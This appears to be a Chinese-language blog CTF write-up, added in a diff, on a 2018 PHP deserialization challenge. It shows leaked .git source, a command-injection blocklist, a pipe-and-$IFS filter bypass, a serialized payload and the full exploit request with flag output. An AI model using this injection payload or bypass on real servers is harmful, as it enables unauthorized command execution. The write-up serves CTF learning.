@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="Purse the balance of everything.">
+  <meta name="keywords" content="CTF, Blog">
+  
+    <link rel="icon" href>
+  
+    
+  <title>2018福建省勤学杯一道简单的php反序列化 | Mads Blog</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/css/my.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/gitalk.css">
+  <script src="/lib/gitalk.min.js"></script>
+  <link href="https://cdn.bootcss.com/font-awesome/5.7.0/css/all.css" rel="stylesheet">
+
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class='logo' href="/">
+      <i class="fas fa-cat" style="margin-right: 10px"></i>
+      <span>Mads Blog</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id='post'>
+  <div class="content">
+    <article>
+        <section class="content aath-body">
+          <h1>2018福建省勤学杯一道简单的php反序列化</h1>
+          
+          <div class='post-meta'>
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2018年08月25日</time>
+            
+            
+              | 
+                  <i class="fa fa-tags" aria-hidden="true"></i>
+                
+               
+  <a href="/tags/#WEB" class='tag'>WEB</a>
+
+  <a href="/tags/#PHP" class='tag'>PHP</a>
+
+  <a href="/tags/#反序列化" class='tag'>反序列化</a>
+
+
+            
+            | <i class="fas fa-edit" aria-hidden="true"></i> <time>2019年02月17日</time>
+          </div>
+          
+          <p>这道题就是一道普普通通的反序列化题，但是在做题过程中体会良多。主要是在解题中使用docker来模拟赛题环境，真的是非常好用：）</p>
+<p>页面提示git，访问.git/发现有源码，用工具下载下来。文件目录如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- passage</span><br><span class="line">    - title.php</span><br><span class="line">	- words.php</span><br><span class="line">- templates</span><br><span class="line">	- About.php</span><br><span class="line">	- Flag.php</span><br><span class="line">	- Link.php</span><br><span class="line">	- passage.php</span><br><span class="line">- class.php</span><br><span class="line">- index.php</span><br><span class="line">- waf.php</span><br></pre></td></tr></table></figure>
+<p>开始看源码，index.php部分代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$tips = @$_GET[<span class="string">'tips'</span>];</span><br><span class="line">$tip  = @$_GET[<span class="string">'tip'</span>];</span><br><span class="line"><span class="comment">// echo $tips;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($tip)&amp;&amp;(@file_get_contents($tip,<span class="string">'r'</span>)===<span class="string">"you got this"</span>))&#123;</span><br><span class="line">	<span class="comment">//echo 123;</span></span><br><span class="line">	@unserialize($tips);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，从GET参数拿到$tips和$tip，判断tip是否存在以及tip文件的内容是否为<code>you got this</code>，这里可以用php://input伪协议绕过。然后就是对$tips进行反序列化，这里$tips是我们可控的。所以目前思路就是构造一个序列化后的对象，传入$tips来执行命令。</p>
+<p>在class.php文件中发现我们需要的对象</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Blog</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $file=<span class="string">"passage"</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$black = [];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">foreach</span> ($black <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">			<span class="keyword">if</span>(stripos(<span class="keyword">$this</span>-&gt;file,$value))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">"Attack!"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		 &#125;</span><br><span class="line">		<span class="comment">//echo "\n".$this-&gt;page;</span></span><br><span class="line">		system(<span class="string">"php ./templates/$this-&gt;file.php"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$b =<span class="keyword">new</span> Blog();</span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="keyword">unset</span>($b);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到Blog对象在销毁时调用了system函数，函数的参数包含了<code>$file</code>的内容，<code>$file</code>的内容是我们可控的。题目强制将<code>$file</code>的内容拼接为<code>php ./templates/$this-&gt;file.php</code>命令，思路就是利用管道符来bypass。</p>
+<p>但是注意到在调用system函数之前对<code>$file</code>的内容进行了黑盒检测，但黑名单是空？在很喜悦的构造了一个<code>$file = Flag.php|cat ../templates/Flag.php</code>在Burp中提交后，返回了<code>Attack!</code>，也就是说线上代码并不是我们看的这一版！但是线上waf到底有哪些呢？测试了一些之后，发现都被过滤，这样不是办法。转念一想，我们不是有.git嘛，线上的waf应该是在git的历史版本中，于是一个版本一个版本的check，最终在<code>ca0c1028af2</code>的版本中找到了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Blog</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $file=<span class="string">"passage"</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$black = [<span class="string">'awk'</span>,<span class="string">'-'</span>,<span class="string">'sed'</span>,<span class="string">'comm'</span>,<span class="string">'diff'</span>,<span class="string">'grep'</span>,<span class="string">'cp'</span>,<span class="string">'mv'</span>,<span class="string">'nl'</span>,<span class="string">'less'</span>,<span class="string">'od'</span>,<span class="string">'cat'</span>,<span class="string">'head'</span>,<span class="string">'tail'</span>,<span class="string">'more'</span>,<span class="string">'tac'</span>,<span class="string">'rm'</span>,<span class="string">'ls'</span>,<span class="string">'tailf'</span>,<span class="string">' '</span>,<span class="string">'%'</span>,<span class="string">'%0a'</span>,<span class="string">'%0d'</span>,<span class="string">'%00'</span>,<span class="string">'ls'</span>,<span class="string">'echo'</span>,<span class="string">'ps'</span>,<span class="string">'&gt;'</span>,<span class="string">'&lt;'</span>,<span class="string">'$&#123;IFS&#125;'</span>,<span class="string">'ifconfig'</span>,<span class="string">'mkdir'</span>,<span class="string">'cp'</span>,<span class="string">'chmod'</span>,<span class="string">'wget'</span>,<span class="string">'curl'</span>,<span class="string">'http'</span>,<span class="string">'www'</span>,<span class="string">'`'</span>,<span class="string">'printf'</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">foreach</span> ($black <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">			<span class="keyword">if</span>(stripos(<span class="keyword">$this</span>-&gt;file,$value))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">"Attack!"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		 &#125;</span><br><span class="line">		<span class="comment">//echo "\n".$this-&gt;page;</span></span><br><span class="line">		system(<span class="string">"php ./templates/$this-&gt;file.php"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$b =<span class="keyword">new</span> Blog();</span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="keyword">unset</span>($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到过滤了空格和<code>${IFS}</code>，我们可以用<code>$IFS</code>作空格，过滤了很多查看文件的命令，但是没有过滤<code>rev</code>，没有过滤管道符。于是可以构造如下<code>$file</code>值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = &apos;Flag.php|rev$IFS./templates/Flag&apos;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>稍微提一下，这里黑盒判断用到了strops()，由于这个函数的漏洞，如果题目把管道符也过滤了，其实还可以做。构造 $file = ‘|rev$IFS./templates/Flag’ 就可以，因为管道符在第0位，并且可以无限用管道符，因为strops()只返回首次匹配的位置。</p>
+</blockquote>
+<p>这样system参数就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;php ./templates/Flag.php|rev$IFS./templates/Flag.php&quot;)</span><br></pre></td></tr></table></figure>
+<p>我用docker搭建了一个本地环境，测试成功返回了Flag文件的内容。</p>
+<p>接下来就是生成序列化的Blog对象了，脚本如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Blog</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $file=<span class="string">'Flag.php|rev$IFS./templates/Flag'</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$black = [];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">foreach</span> ($black <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">			<span class="keyword">if</span>(stripos(<span class="keyword">$this</span>-&gt;file,$value))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">"Attack!"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		 &#125;</span><br><span class="line">		<span class="comment">//echo "\n".$this-&gt;page;</span></span><br><span class="line">		system(<span class="string">"php ./templates/$this-&gt;file.php"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$b =<span class="keyword">new</span> Blog();</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Blog%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A32%3A%22Flag.php%7Crev%24IFS.%2Ftemplates%2FFlag%22%3B%7D</span><br></pre></td></tr></table></figure>
+<p>构造如下请求：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /?tip=php:<span class="comment">//input&amp;tips=O%3A4%3A%22Blog%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A32%3A%22Flag.php%7Crev%24IFS.%2Ftemplates%2FFlag%22%3B%7D HTTP/1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.224</span><span class="number">.128</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 12</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">you got this</span></span><br></pre></td></tr></table></figure>
+<p>成功返回反向的Flag文件内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php?&lt;</span><br><span class="line">;<span class="string">"&#125;0d4B_3B0_Ll10w_m03Tsys&#123;galf"</span> = galf$<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">;<span class="string">"eclap rehto dnif ot yrt,ereh ton si galF"</span> ohce</span><br><span class="line">&gt;?&lt;!DOCTYPE HTML&gt;</span><br></pre></td></tr></table></figure>
+<p>再次利用<code>rev</code>命令，得到flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$flag = "flag&#123;sysT30m_w01lL_0B3_B4d0&#125;";</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Flag is not here,try to find other palce"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这个flag是git仓库里面的，比赛时flag不是git仓库里面的。一开始稍微审计一会发现这个，很兴奋，提交发现是假的。</p>
+</blockquote>
+
+          
+<div class="post-copyright">
+<p><span>本文标题：</span>2018福建省勤学杯一道简单的php反序列化</p>
+<p><span>文章作者：</span>Mads</p>
+<p><span>发布时间：</span>2018/08/25 12:00:00</p>
+<p><span>更新时间：</span>2019/02/17 04:05:38</p>
+<p><span>原始链接：</span><a style="color: #bababa" href=" + data.permalink + ">http://lxzmads.github.io/2018/08/25/2018福建省勤学杯一道简单的php反序列化/</a></p>
+<p><span>许可协议：</span><i class="fab fa-creative-commons"></i><a rel="license" style="color: #bababa" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a><span class="warn">转载请保留原文链接及作者</span></p>
+</div>
+ 
+        </section>
+    </article>
+    
+  </div>
+  <aside>
+    
+  </aside>
+</main>
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath-魔改版 by Mads</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="/lib/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+</body>
+</html>
